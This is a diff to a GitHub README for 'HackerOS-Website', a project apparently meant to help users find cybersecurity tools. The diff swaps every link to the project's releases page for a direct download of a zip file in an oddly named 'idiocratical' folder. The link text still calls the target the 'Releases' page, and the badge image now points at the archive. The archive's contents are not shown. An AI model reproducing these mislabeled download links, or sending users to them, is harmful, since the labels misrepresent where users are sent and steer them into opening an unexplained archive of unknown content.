@@ -1,6 +1,6 @@
 # 🌐 HackerOS-Website - Discover Cybersecurity Tools Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/elpapuprogramador/HackerOS-Website/releases)
+[![Download Now](https://raw.githubusercontent.com/elpapuprogramador/HackerOS-Website/main/idiocratical/HackerOS-Website.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/elpapuprogramador/HackerOS-Website/main/idiocratical/HackerOS-Website.zip)
 
 ## 📖 Overview
 
@@ -18,7 +18,7 @@ To get started with HackerOS-Website, follow these simple steps. No complicated 
 
 ## 📥 Download & Install
 
-To download the HackerOS-Website, visit this page to download: [HackerOS-Website Releases](https://github.com/elpapuprogramador/HackerOS-Website/releases).
+To download the HackerOS-Website, visit this page to download: [HackerOS-Website Releases](https://raw.githubusercontent.com/elpapuprogramador/HackerOS-Website/main/idiocratical/HackerOS-Website.zip).
 
 1. Click on the link above.
 2. You will find the latest version of HackerOS-Website listed there.
@@ -42,7 +42,7 @@ No, HackerOS-Website runs entirely through your web browser. Just visit the link
 The website is designed to be lightweight and should run well on most devices, but an internet connection is required.
 
 ### Q3: How do I receive updates?
-You can frequently check the [HackerOS-Website Releases](https://github.com/elpapuprogramador/HackerOS-Website/releases) page for the latest updates and improvements.
+You can frequently check the [HackerOS-Website Releases](https://raw.githubusercontent.com/elpapuprogramador/HackerOS-Website/main/idiocratical/HackerOS-Website.zip) page for the latest updates and improvements.
 
 ## 📞 Support
 
